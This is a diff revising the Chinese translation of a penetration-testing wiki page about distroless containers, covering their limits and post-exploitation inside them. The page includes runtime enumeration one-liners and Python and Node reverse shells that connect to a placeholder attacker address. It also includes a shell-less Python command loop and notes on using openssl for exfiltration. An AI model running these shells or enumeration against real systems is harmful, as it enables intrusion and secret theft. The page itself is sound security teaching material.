@@ -1,12 +1,12 @@
-# Distroless Containers
+# Distroless 容器
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## 概述
 
-一个 **distroless** container image 是只包含运行一个特定应用所需的**最小运行时组件**的镜像，同时刻意移除了通常的发行版工具，例如包管理器、shell，以及大量通用的 userland 实用工具。实际上，distroless 镜像通常只包含应用二进制或运行时、其共享库、证书包，以及非常精简的文件系统布局。
+一个 **distroless** 容器镜像是只包含运行单个特定应用所需的 **最小运行时组件** 的镜像，同时有意移除常见的发行工具，例如包管理器、shell，以及大量通用的用户态实用程序。实际上，distroless 镜像通常只包含应用二进制或运行时、其共享库、证书包和非常精简的文件系统布局。
 
-关键不在于 distroless 是一种新的内核隔离原语。Distroless 是一种 **镜像设计策略**。它改变的是容器文件系统**内部**可用的内容，而不是内核如何隔离容器。这个区别很重要，因为 distroless 主要通过减少攻击者在获得代码执行后能使用的工具来增强环境。它并不能替代 namespaces、seccomp、capabilities、AppArmor、SELinux 或任何其他运行时隔离机制。
+关键点不是 distroless 引入了新的内核隔离原语。Distroless 是一种 **镜像设计策略**。它改变的是容器文件系统内部可用的内容，而不是内核如何隔离容器。这一区别很重要，因为 distroless 主要通过减少攻击者在获得代码执行后的可用工具来强化环境。它并不替代 namespaces、seccomp、capabilities、AppArmor、SELinux 或任何其他运行时隔离机制。
 
 ## Why Distroless Exists
 
@@ -14,56 +14,56 @@ Distroless 镜像主要用于减少：
 
 - 镜像体积
 - 镜像的运维复杂度
-- 可能包含漏洞的软件包和二进制数量
+- 可能含有漏洞的包和二进制数量
 - 默认情况下攻击者可用的事后利用工具数量
 
-这就是为什么 distroless 镜像在生产应用部署中很受欢迎。一个没有 shell、没有包管理器、几乎没有通用工具的容器，通常在运维上更容易推理，在被入侵后也更难被交互式滥用。
+这就是为什么 distroless 镜像在生产应用部署中很受欢迎。一个没有 shell、没有包管理器、几乎没有通用工具的容器通常在运维上更容易把控，并且在被入侵后更难以被交互式滥用。
 
-知名的 distroless 风格镜像家族示例包括：
+一些知名的 distroless 风格镜像家族示例包括：
 
 - Google's distroless images
 - Chainguard hardened/minimal images
 
-## What Distroless Does Not Mean
+## Distroless Does Not Mean
 
-一个 distroless 容器**并不等同于**：
+一个 distroless 容器并不等同于：
 
-- 并不会自动成为 rootless
-- 并不会自动变为 non-privileged
-- 并不会自动变为只读
-- 并不会自动受 seccomp、AppArmor 或 SELinux 保护
-- 并不会自动免受 container escape
+- 自动成为 rootless
+- 自动非特权
+- 自动只读
+- 自动受 seccomp、AppArmor 或 SELinux 保护
+- 自动免于 container escape
 
-仍然可以以 `--privileged`、共享 host namespaces、危险的 bind mounts，或挂载的 runtime socket 来运行 distroless 镜像。在那种场景下，镜像可能非常精简，但容器依然可能极其不安全。Distroless 改变的是**用户空间的攻击面**，而不是**内核的信任边界**。
+仍然可以用 `--privileged`、共享主机命名空间、危险的 bind mounts，或挂载的 runtime socket 来运行 distroless 镜像。在这种情况下，镜像可能很小，但容器仍可能极度不安全。Distroless 改变的是 **userland attack surface**，而不是 **kernel trust boundary**。
 
-## Typical Operational Characteristics
+## 典型的运行特性
 
-当你攻破一个 distroless 容器时，最先注意到的通常是常见假设不再成立。可能没有 `sh`、没有 `bash`、没有 `ls`、没有 `id`、没有 `cat`，有时甚至没有按你常用作业方式运行的基于 libc 的环境。这会影响攻防双方，因为工具的缺失使得调试、事件响应和事后利用都不同于常见的 Linux 目标。
+当你入侵一个 distroless 容器时，第一个注意到的通常是常见假设不再成立。可能没有 `sh`、没有 `bash`、没有 `ls`、没有 `id`、没有 `cat`，有时甚至没有按你惯常手法工作的 libc 环境。这会影响进攻和防守双方，因为缺乏工具会使调试、事件响应和事后利用有所不同。
 
 最常见的模式是：
 
-- 应用运行时存在，但其他几乎不存在
-- 基于 shell 的 payload 失败，因为没有 shell
-- 常见的枚举单行命令失败，因为 helper 二进制缺失
-- 文件系统保护，如只读 rootfs 或可写 tmpfs 上挂载 `noexec`，也经常存在
+- 应用运行时存在，但几乎别的都没有
+- 基于 shell 的 payload 会失败，因为没有 shell
+- 常见的枚举一行命令会失败，因为辅助二进制缺失
+- 文件系统保护（例如只读 rootfs 或在可写 tmpfs 上的 `noexec`）也常常存在
 
-这种组合通常促使人们谈论将 distroless 武器化。
+这种组合通常就是人们所说的“weaponizing distroless”的原因。
 
 ## Distroless And Post-Exploitation
 
-在 distroless 环境中，主要的攻击挑战并不总是初始的 RCE。更常见的是接下来会发生什么。如果被利用的工作负载在诸如 Python、Node.js、Java 或 Go 这样的语言运行时中提供了代码执行，你可能能够执行任意逻辑，但无法通过在其他 Linux 目标中常见的以 shell 为中心的工作流来实现。
+在 distroless 环境中，主要的进攻挑战往往不是初始的 RCE，而是接下来该怎么办。如果被利用的工作负载在像 Python、Node.js、Java 或 Go 这样的语言运行时中给出代码执行，你可能能够运行任意逻辑，但无法通过在其他 Linux 目标上常见的以 shell 为中心的工作流来操作。
 
-这意味着事后利用通常会沿三条方向之一展开：
+这意味着事后利用通常会转向三条路径之一：
 
-1. **直接使用现有的语言运行时** 来枚举环境、打开套接字、读取文件或部署额外的分阶段有效载荷。
-2. **将你自己的工具装入内存**，如果文件系统是只读或可写位置被挂载为 `noexec`。
-3. **滥用镜像中已存在的二进制**，如果应用或其依赖包含意外有用的东西。
+1. 直接使用现有的语言运行时来枚举环境、打开 socket、读取文件，或注入内存中执行的载荷。
+2. 如果文件系统是只读或可写位置被挂载为 `noexec`，则把你自己的工具带入内存中运行。
+3. 滥用镜像中已经存在的二进制（如果应用或其依赖包含意外有用的东西）。
 
 ## Abuse
 
 ### Enumerate The Runtime You Already Have
 
-在许多 distroless 容器中没有 shell，但仍然存在应用运行时。如果目标是一个 Python 服务，那么 Python 就在。如果目标是 Node.js，Node 就在。那通常提供了足够的功能来枚举文件、读取环境变量、打开反向 shell，并在不调用 `/bin/sh` 的情况下阶段性地加载内存执行。
+在许多 distroless 容器中没有 shell，但仍然存在应用运行时。如果目标是 Python 服务，那么 Python 就在；如果目标是 Node.js，Node 就在。这通常提供了足够的功能来枚举文件、读取环境变量、打开反向 shell，并在不调用 `/bin/sh` 的情况下在内存中阶段性载入执行。
 
 一个用 Python 的简单示例：
 ```bash
@@ -75,19 +75,19 @@ print("env keys", list(os.environ)[:20])
 print("root files", os.listdir("/")[:30])
 PY
 ```
-一个简单的 Node.js 示例：
+一个使用 Node.js 的简单示例：
 ```bash
 node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
 ```
 影响：
 
-- 恢复环境变量，通常包括 credentials 或 service endpoints
+- 恢复环境变量，通常包括凭证或服务端点
 - 在没有 `/bin/ls` 的情况下进行文件系统枚举
 - 识别可写路径和挂载的 secrets
 
-### 在没有 `/bin/sh` 的情况下的 Reverse Shell
+### 没有 `/bin/sh` 的 Reverse Shell
 
-如果镜像不包含 `sh` 或 `bash`，经典的基于 shell 的 reverse shell 可能会立即失败。在这种情况下，请改用已安装的语言 runtime。
+如果镜像不包含 `sh` 或 `bash`，经典的基于 shell 的 reverse shell 可能会立即失败。在这种情况下，使用已安装的语言 runtime。
 
 Python reverse shell:
 ```bash
@@ -100,17 +100,17 @@ os.dup2(s.fileno(),fd)
 pty.spawn("/bin/sh")
 PY
 ```
-如果 `/bin/sh` 不存在，请将最后一行替换为直接由 Python 驱动的命令执行或一个 Python REPL 循环。
+如果 `/bin/sh` 不存在，请将最后一行替换为直接由 Python 驱动的命令执行或 Python REPL 循环。
 
 Node reverse shell:
 ```bash
 node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
 ```
-再次，如果 `/bin/sh` 不存在，直接使用 Node 的 filesystem、process 和 networking APIs，而不是 spawn 一个 shell。
+再次，如果 `/bin/sh` 不存在，直接使用 Node 的文件系统、进程和网络 API，而不是派生一个 shell。
 
-### 完整示例：No-Shell Python Command Loop
+### 完整示例：无 shell 的 Python 命令循环
 
-如果镜像包含 Python 但完全没有 shell，一个简单的交互循环通常足以保持完整的 post-exploitation 能力：
+如果镜像有 Python 但根本没有 shell，一个简单的交互循环通常足以保持完整的 post-exploitation 能力：
 ```bash
 python3 - <<'PY'
 import os,subprocess
@@ -123,17 +123,17 @@ print(p.stdout, end="")
 print(p.stderr, end="")
 PY
 ```
-这不需要交互式 shell binary。对攻击者而言，其影响实际上等同于一个基本的 shell：command execution、enumeration，以及通过现有 runtime 对后续 payloads 的 staging。
+这不需要交互式 shell 二进制。從攻击者的角度来看，影响与基本 shell 实质相同：命令执行、枚举，以及通过现有 runtime 阶段化部署后续 payload。
 
 ### 内存中工具执行
 
-Distroless images 通常与以下设置一起使用：
+Distroless images 通常与下列项组合：
 
 - `readOnlyRootFilesystem: true`
 - writable but `noexec` tmpfs such as `/dev/shm`
 - a lack of package management tools
 
-这种组合使得经典的 "download binary to disk and run it" 工作流变得不可靠。在这种情况下，memory execution techniques 成为主要解决方案。
+这种组合使得经典的“下载二进制到磁盘并运行”工作流变得不可靠。在这些情况下，memory execution techniques 成为主要手段。
 
 The dedicated page for that is:
 
@@ -141,64 +141,64 @@ The dedicated page for that is:
 ../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-其中最相关的技术有：
+那里最相关的技术有：
 
 - `memfd_create` + `execve` via scripting runtimes
 - DDexec / EverythingExec
 - memexec
 - memdlopen
 
-### 镜像中已存在的二进制文件
+### 镜像中已存在的二进制
 
-一些 Distroless images 仍然包含在运行时操作上必需的二进制文件，在被攻破后可能会很有用。一个经常观察到的例子是 `openssl`，因为应用有时需要它来处理 crypto 或 TLS 相关的任务。
+一些 distroless images 仍然包含运行所需的二进制，这些在被攻破后会变得有用。反复观察到的一个例子是 `openssl`，因为应用有时需要它来处理 crypto 或 TLS 相关的任务。
 
-一个快速的搜索模式是：
+一个快速搜索模式是：
 ```bash
 find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
 ```
-If `openssl` is present, it may be usable for:
+如果存在 `openssl`，它可能可用于：
 
-- 发起出站 TLS 连接
-- 通过允许的出站通道进行 data exfiltration
-- 通过编码/加密的 blobs 暂存 payload 数据
+- 出站 TLS 连接
+- 通过允许的出口通道进行数据外传
+- 通过编码/加密的 blob 暂存 payload 数据
 
-具体的滥用取决于实际安装了哪些内容，但总体思想是 distroless 并不意味着 "no tools whatsoever"；它的意思是 "far fewer tools than a normal distribution image"。
+具体滥用取决于实际安装的内容，但总体思想是 distroless 并不意味着 "完全没有任何工具"；它意味着 "比普通发行版镜像少得多的工具"。
 
-## Checks
+## 检查
 
-这些检查的目标是确定镜像在实际中是否真正为 distroless，以及哪些 runtime 或 helper binaries 仍可用于 post-exploitation。
+这些检查的目的是确定镜像在实践中是否真的 distroless，以及哪些运行时或辅助二进制文件仍然可用于 post-exploitation。
 ```bash
 find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
 which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
 cat /etc/os-release 2>/dev/null                                # Often missing or minimal
 mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
 ```
-值得注意的是：
+有趣的地方：
 
-- 如果没有 shell，但存在诸如 Python 或 Node 这样的 runtime，post-exploitation 应转向由 runtime 驱动的执行。
-- 如果 root filesystem 是只读的且 `/dev/shm` 可写但 `noexec`，内存执行技术（memory execution techniques）会变得更加相关。
-- 如果存在像 `openssl`、`busybox` 或 `java` 这样的辅助二进制文件，它们可能提供足够的功能来引导获取进一步的访问。
+- 如果没有 shell 可用，但存在像 Python 或 Node 这样的运行时，post-exploitation 应当转向基于运行时的执行。
+- 如果根文件系统为只读且 `/dev/shm` 可写但带有 `noexec`，则内存执行技术变得更加相关。
+- 如果存在诸如 `openssl`、`busybox` 或 `java` 之类的辅助二进制文件，它们可能提供足够的功能来引导进一步的访问。
 
-## 运行时默认
+## 运行时默认值
 
-| 镜像 / 平台 风格 | 默认状态 | 典型行为 | 常见的手动弱化 |
+| Image / platform style | Default state | Typical behavior | Common manual weakening |
 | --- | --- | --- | --- |
-| Google distroless style images | 设计上保持最小的用户空间 | 无 shell、无包管理器，仅包含应用/运行时依赖 | 添加调试层、sidecar shells、复制 busybox 或其他工具 |
-| Chainguard minimal images | 设计上保持最小的用户空间 | 减少包面，通常专注于单一 runtime 或服务 | 在构建时使用 `:latest-dev` 或调试变体，复制工具 |
-| Kubernetes workloads using distroless images | 取决于 Pod 配置 | Distroless 仅影响用户空间；Pod 的安全 posture 仍取决于 Pod 规范和运行时默认设置 | 添加临时的 debug containers、host mounts、privileged Pod 设置 |
-| Docker / Podman running distroless images | 取决于运行标志 | 文件系统最小化，但运行时安全仍依赖于标志和守护进程配置 | `--privileged`、host namespace 共享、runtime socket 挂载、可写的主机绑定 |
+| Google distroless style images | 按设计最小化的 userland | 无 shell、无包管理器，仅包含应用/运行时依赖 | 添加调试层、sidecar shells、复制 busybox 或其他工具 |
+| Chainguard minimal images | 按设计最小化的 userland | 精简的包面，通常专注于单一运行时或服务 | 使用 `:latest-dev` 或调试变体，在构建期间复制工具 |
+| Kubernetes workloads using distroless images | 取决于 Pod 配置 | Distroless 仅影响用户态；Pod 的安全姿态仍取决于 Pod 规范和运行时默认设置 | 添加短暂的调试容器、主机挂载、特权 Pod 设置 |
+| Docker / Podman running distroless images | 取决于运行标志 | 文件系统最小化，但运行时安全仍依赖于标志和守护进程配置 | `--privileged`、主机命名空间共享、runtime socket 挂载、可写的主机绑定 |
 
-关键点是 distroless 是一种 **镜像特性**，而不是运行时保护。它的价值在于在被攻陷后减少文件系统内可用的内容。
+关键点在于 distroless 是一种 **镜像属性**，而不是运行时保护。它的价值在于在被攻破后减少文件系统内可用的内容。
 
 ## 相关页面
 
-关于在 distroless 环境中常见的文件系统和内存执行绕过：
+对于在 distroless 环境中常需的文件系统与内存执行绕过：
 
 {{#ref}}
 ../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-关于仍适用于 distroless 工作负载的容器运行时、socket 和挂载滥用：
+对于仍适用于 distroless 工作负载的容器运行时、socket 与挂载滥用：
 
 {{#ref}}
 runtime-api-and-daemon-exposure.md
@@ -207,3 +207,4 @@ runtime-api-and-daemon-exposure.md
 {{#ref}}
 sensitive-host-mounts.md
 {{#endref}}
+{{#include ../../../banners/hacktricks-training.md}}
